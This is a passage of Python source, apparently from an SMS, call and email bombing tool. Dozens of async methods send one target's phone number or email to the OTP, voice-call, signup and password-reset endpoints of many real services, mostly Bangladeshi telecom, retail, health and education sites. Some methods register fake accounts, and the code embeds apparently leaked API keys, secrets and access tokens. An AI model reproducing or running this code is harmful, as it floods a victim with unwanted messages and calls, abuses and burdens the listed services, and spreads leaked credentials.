            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[60 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL60 - Extra API 60", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL60 - Extra API 60", False, "Error")
            return False

    async def api_call61___extra_call_api_61(self):
        target = self.target
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[61 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL61 - Extra API 61", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL61 - Extra API 61", False, "Error")
            return False

    async def api_email49___quora_signup(self):
        target = self.target
        url = "https://www.quora.com/api/v1/auth/signup"
        try:
            async with self.session.post(url, json={"email": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201, 403]
                await self.log_event("EMAIL49 - Quora Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL49 - Quora Signup", False, "Error")
            return False

    async def api_email50___pinterest_signup(self):
        target = self.target
        url = "https://www.pinterest.com/resource/UserRegisterResource/create/"
        try:
            async with self.session.post(url, data={"email": target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL50 - Pinterest Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL50 - Pinterest Signup", False, "Error")
            return False

    async def api_api1___redx_signup(self):
        target = self.target
        url = f"https://api.redx.com.bd:443/v1/user/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"phone":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API1 - RedX Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API1 - RedX Signup", False, "Error")
            return False


    async def api_api2___khaasfood_otp(self):
        target = self.target
        url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={target}".replace("{phone}", target)
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API2 - KhaasFood OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API2 - KhaasFood OTP", False, "Error")
            return False


    async def api_api3___bioscope_login(self):
        target = '+88' + self.target
        url = f"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API3 - Bioscope Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API3 - Bioscope Login", False, "Error")
            return False


    async def api_api4___bikroy_phone_login(self):
        target = self.target
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}".replace("{phone}", target)
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API4 - Bikroy Phone Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API4 - Bikroy Phone Login", False, "Error")
            return False


    async def api_api5___proiojon_signup(self):
        target = self.target
        url = f"https://billing.proiojon.com/api/v1/auth/sign-up".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"name":"{randomName}","phone":"{phone}","email":"{randomEmail}","password":"password123","ref_code":""}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API5 - Proiojon Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API5 - Proiojon Signup", False, "Error")
            return False


    async def api_api6___beautybooth_signup(self):
        target = self.target
        url = f"https://admin.beautybooth.com.bd/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API6 - BeautyBooth Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API6 - BeautyBooth Signup", False, "Error")
            return False


    async def api_api7___medha_otp(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://developer.medha.info/api/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API7 - Medha OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API7 - Medha OTP", False, "Error")
            return False


    async def api_api8___deeptoplay_login(self):
        target = '+88' + self.target
        url = f"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API8 - Deeptoplay Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API8 - Deeptoplay Login", False, "Error")
            return False


    async def api_api9___robi_otp(self):
        target = self.target
        url = f"https://webapi.robi.com.bd/v1/account/register/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API9 - Robi OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API9 - Robi OTP", False, "Error")
            return False


    async def api_api10___arogga_sms(self):
        target = self.target
        url = f"https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API10 - Arogga SMS", success, res.status)
                return success
        except Exception:
            await self.log_event("API10 - Arogga SMS", False, "Error")
            return False


    async def api_api11___mygp_otp(self):
        target = self.target
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{target}/"
        try:
            async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API11 - MyGP OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API11 - MyGP OTP", False, "Error")
            return False


    async def api_api12___bdstall_otp(self):
        target = self.target
        url = f"https://www.bdstall.com/userRegistration/save_otp_info/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API12 - BDSTall OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API12 - BDSTall OTP", False, "Error")
            return False


    async def api_api13___bcs_exam_otp(self):
        target = self.target
        url = f"https://bcsexamaid.com/api/generateotp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API13 - BCS Exam OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API13 - BCS Exam OTP", False, "Error")
            return False


    async def api_api14___doctorlive_otp(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://doctorlivebd.com/api/patient/auth/otpsend".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API14 - DoctorLive OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API14 - DoctorLive OTP", False, "Error")
            return False


    async def api_api15___sheba_otp(self):
        target = '+88' + self.target
        url = f"https://accountkit.sheba.xyz/api/shoot-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{token}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API15 - Sheba OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API15 - Sheba OTP", False, "Error")
            return False


    async def api_api16___apex4u_login(self):
        target = self.target
        url = f"https://api.apex4u.com/api/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API16 - Apex4U Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API16 - Apex4U Login", False, "Error")
            return False


    async def api_api17___sindabad_otp(self):
        target = '+88' + self.target
        url = f"https://offers.sindabad.com/api/mobile-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API17 - Sindabad OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API17 - Sindabad OTP", False, "Error")
            return False


    async def api_api18___kirei_otp(self):
        target = self.target
        url = f"https://app.kireibd.com/api/v2/send-login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API18 - Kirei OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API18 - Kirei OTP", False, "Error")
            return False


    async def api_api19___shikho_sms(self):
        target = self.target
        url = f"https://api.shikho.com/auth/v2/send/sms".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API19 - Shikho SMS", success, res.status)
                return success
        except Exception:
            await self.log_event("API19 - Shikho SMS", False, "Error")
            return False


    async def api_api20___circle_signup(self):
        target = '+88' + self.target
        url = f"https://reseller.circle.com.bd/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"name":"+88{phone}","email_or_phone":"+88{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API20 - Circle Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API20 - Circle Signup", False, "Error")
            return False


    async def api_api21___bdtickets_auth(self):
        target = '+88' + self.target
        url = f"https://api.bdtickets.com:20100/v1/auth".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API21 - BDTickets Auth", success, res.status)
                return success
        except Exception:
            await self.log_event("API21 - BDTickets Auth", False, "Error")
            return False


    async def api_api22___grameenphone_otp(self):
        target = self.target
        url = f"https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API22 - Grameenphone OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API22 - Grameenphone OTP", False, "Error")
            return False


    async def api_api23___rfl_bestbuy_login(self):
        target = self.target
        url = f"https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API23 - RFL BestBuy Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API23 - RFL BestBuy Login", False, "Error")
            return False


    async def api_api24___chorki_login(self):
        target = self.target
        url = f"https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API24 - Chorki Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API24 - Chorki Login", False, "Error")
            return False


    async def api_api25___hishab_express_login(self):
        target = self.target
        url = f"https://api.hishabexpress.com/login/status".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API25 - Hishab Express Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API25 - Hishab Express Login", False, "Error")
            return False


    async def api_api26___chorcha_auth_check(self):
        target = self.target
        url = f"https://mujib.chorcha.net/auth/check?phone={target}".replace("{phone}", target)
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API26 - Chorcha Auth Check", success, res.status)
                return success
        except Exception:
            await self.log_event("API26 - Chorcha Auth Check", False, "Error")
            return False


    async def api_api27___wafilife_otp(self):
        target = self.target
        url = f"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={target}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API27 - Wafilife OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API27 - Wafilife OTP", False, "Error")
            return False


    async def api_api28___robi_account_otp(self):
        target = self.target
        url = f"https://webapi.robi.com.bd/v1/account/register/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API28 - Robi Account OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API28 - Robi Account OTP", False, "Error")
            return False


    async def api_api29___chardike_otp(self):
        target = self.target
        url = f"https://api.chardike.com/api/chardike-login-need".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API29 - Chardike OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API29 - Chardike OTP", False, "Error")
            return False


    async def api_api30___e_testpaper_otp(self):
        target = self.target
        url = f"https://dev.etestpaper.net/api/v4/auth/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API30 - E-TestPaper OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API30 - E-TestPaper OTP", False, "Error")
            return False


    async def api_api31___gpay_signup(self):
        target = self.target
        url = f"https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API31 - GPay Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API31 - GPay Signup", False, "Error")
            return False


    async def api_api32___applink_otp(self):
        target = '88' + self.target
        url = f"https://apps.applink.com.bd/appstore-v4-server/login/otp/request".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API32 - Applink OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API32 - Applink OTP", False, "Error")
            return False


    async def api_api33___priyoshikkhaloy(self):
        target = self.target
        url = f"https://app.priyoshikkhaloy.com/api/user/register-login.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API33 - Priyoshikkhaloy", success, res.status)
                return success
        except Exception:
            await self.log_event("API33 - Priyoshikkhaloy", False, "Error")
            return False


    async def api_api34___kabbik_otp(self):
        target = '88' + self.target
        url = f"https://api.kabbik.com/v1/auth/otpnew".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"msisdn":"88{phone}","currentTimeLong":" + System.currentTimeMillis() + ","passKey":"qOQNBtVmoTTPVmfn"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API34 - Kabbik OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API34 - Kabbik OTP", False, "Error")
            return False


    async def api_api35___salextra(self):
        target = self.target
        url = f"https://salextra.com.bd/customer/checkusernameavailabilityonregistration".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API35 - Salextra", success, res.status)
                return success
        except Exception:
            await self.log_event("API35 - Salextra", False, "Error")
            return False


    async def api_api36___sundora(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://api.sundora.com.bd/api/user/customer/".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"customer":{"email":"user{phone}@gmail.com","password":"#bUV?\'3*N#7N}.g","password_confirmation":"#bUV?\'3*N#7N}.g","phone":"+880{phone}","draft_order_id":null,"first_name":"User","last_name":"Test","note":{"birthday":"","gender":"male"},"withTimeout":true,"newsletter_email":true,"newsletter_sms":true}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API36 - Sundora", success, res.status)
                return success
        except Exception:
            await self.log_event("API36 - Sundora", False, "Error")
            return False


    async def api_api37___mygp_cinematic(self):
        target = self.target
        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{target}/SBENT_3GB7D"
        try:
            async with self.session.post(url, json=json.loads('{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API37 - MyGP Cinematic", success, res.status)
                return success
        except Exception:
            await self.log_event("API37 - MyGP Cinematic", False, "Error")
            return False


    async def api_api38___bajistar(self):
        target = self.target
        url = f"https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{target}"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API38 - Bajistar", success, res.status)
                return success
        except Exception:
            await self.log_event("API38 - Bajistar", False, "Error")
            return False


    async def api_api39___doctime(self):
        target = self.target
        url = f"https://api.doctime.com.bd/api/authenticate".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API39 - Doctime", success, res.status)
                return success
        except Exception:
            await self.log_event("API39 - Doctime", False, "Error")
            return False


    async def api_api40___grameenphone_fi(self):
        target = self.target
        url = f"https://webloginda.grameenphone.com/backend/api/v1/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API40 - Grameenphone FI", success, res.status)
                return success
        except Exception:
            await self.log_event("API40 - Grameenphone FI", False, "Error")
            return False


    async def api_api41___meenabazar(self):
        target = self.target
        url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={target}&type=login"
        try:
            async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API41 - Meenabazar", success, res.status)
                return success
        except Exception:
            await self.log_event("API41 - Meenabazar", False, "Error")
            return False


    async def api_api42___medeasy(self):
        target = '+88' + self.target
        url = f"https://api.medeasy.health/api/send-otp/+88{target}/"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API42 - Medeasy", success, res.status)
                return success
        except Exception:
            await self.log_event("API42 - Medeasy", False, "Error")
            return False


    async def api_api43___iqra_live(self):
        target = self.target
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{target}"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API43 - Iqra Live", success, res.status)
                return success
        except Exception:
            await self.log_event("API43 - Iqra Live", False, "Error")
            return False


    async def api_api44___chokrojan(self):
        target = self.target
        url = f"https://chokrojan.com/api/v1/passenger/login/mobile".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API44 - Chokrojan", success, res.status)
                return success
        except Exception:
            await self.log_event("API44 - Chokrojan", False, "Error")
            return False


    async def api_api45___shomvob(self):
        target = self.target
        url = f"https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API45 - Shomvob", success, res.status)
                return success
        except Exception:
            await self.log_event("API45 - Shomvob", False, "Error")
            return False


    async def api_api46___redx_signup_2(self):
        target = self.target
        url = f"https://api.redx.com.bd/v1/user/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API46 - RedX Signup 2", success, res.status)
                return success
        except Exception:
            await self.log_event("API46 - RedX Signup 2", False, "Error")
            return False


    async def api_api47___mygp_send_otp(self):
        target = self.target
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{target}/"
        try:
            async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API47 - MyGP Send OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API47 - MyGP Send OTP", False, "Error")
            return False


    async def api_api48___bdjobs(self):
        target = self.target
        url = f"https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"firstName":"User","lastName":"","gender":"M","email":"user{phone}@gmail.com","userName":"{phone}","password":"Password@123","confirmPassword":"Password@123","mobile":"{phone}","countryCode":"88"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API48 - BDJobs", success, res.status)
                return success
        except Exception:
            await self.log_event("API48 - BDJobs", False, "Error")
            return False


    async def api_api49___ultimate_organic_register(self):
        target = self.target
        url = f"https://ultimateasiteapi.com/api/register-customer".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API49 - Ultimate Organic Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API49 - Ultimate Organic Register", False, "Error")
            return False


    async def api_api50___ultimate_organic_forget(self):
        target = self.target
        url = f"https://ultimateasiteapi.com/api/forget-customer-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API50 - Ultimate Organic Forget", success, res.status)
                return success
        except Exception:
            await self.log_event("API50 - Ultimate Organic Forget", False, "Error")
            return False


    async def api_api51___foodaholic(self):
        target = '+88' + self.target
        url = f"https://foodaholic.com.bd/api/v1/auth/login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API51 - Foodaholic", success, res.status)
                return success
        except Exception:
            await self.log_event("API51 - Foodaholic", False, "Error")
            return False


    async def api_api52___kfc_bd(self):
        target = self.target
        url = f"https://api.kfcbd.com/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"name":"User","email":"user{phone}@gmail.com","mobile":"{phone}","device_token":"test","otp":null}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API52 - KFC BD", success, res.status)
                return success
        except Exception:
            await self.log_event("API52 - KFC BD", False, "Error")
            return False


    async def api_api53___gp_offer_otp(self):
        target = self.target
        url = f"https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API53 - GP Offer OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API53 - GP Offer OTP", False, "Error")
            return False


    async def api_api54___eonbazar_register(self):
        target = self.target
        url = f"https://app.eonbazar.com/api/auth/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"mobile":"{phone}","name":"User Test","password":"Password123","email":"user{phone}@gmail.com"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API54 - Eonbazar Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API54 - Eonbazar Register", False, "Error")
            return False


    async def api_api55___eat_z(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://api.eat-z.com/auth/customer/app-connect".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API55 - Eat-Z", success, res.status)
                return success
        except Exception:
            await self.log_event("API55 - Eat-Z", False, "Error")
            return False


    async def api_api56___osudpotro(self):
        target = self.target
        url = f"https://api.osudpotro.com/api/v1/users/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API56 - Osudpotro", success, res.status)
                return success
        except Exception:
            await self.log_event("API56 - Osudpotro", False, "Error")
            return False


    async def api_api57___kormi24(self):
        target = self.target
        url = f"https://api.kormi24.com/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"operationName":"sendOTP","variables":{"type":1,"mobile":"{phone}","hash":"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},"query":"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API57 - Kormi24", success, res.status)
                return success
        except Exception:
            await self.log_event("API57 - Kormi24", False, "Error")
            return False


    async def api_api58___weblogin_gp(self):
        target = self.target
        url = f"https://weblogin.grameenphone.com/backend/api/v1/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API58 - Weblogin GP", success, res.status)
                return success
        except Exception:
            await self.log_event("API58 - Weblogin GP", False, "Error")
            return False


    async def api_api59___shwapno(self):
        target = '+88' + self.target
        url = f"https://www.shwapno.com/api/auth".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API59 - Shwapno", success, res.status)
                return success
        except Exception:
            await self.log_event("API59 - Shwapno", False, "Error")
            return False


    async def api_api60___quizgiri(self):
        target = self.target
        url = f"https://developer.quizgiri.xyz:443/api/v2.0/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API60 - Quizgiri", success, res.status)
                return success
        except Exception:
            await self.log_event("API60 - Quizgiri", False, "Error")
            return False


    async def api_api61___banglalink_mybl(self):
        target = self.target
        url = f"https://myblapi.banglalink.net/api/v1/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API61 - Banglalink MyBL", success, res.status)
                return success
        except Exception:
            await self.log_event("API61 - Banglalink MyBL", False, "Error")
            return False


    async def api_api62___walton_plaza(self):
        target = self.target
        url = f"https://api.waltonplaza.com.bd/graphql".replace("{phone}", target)
        try:
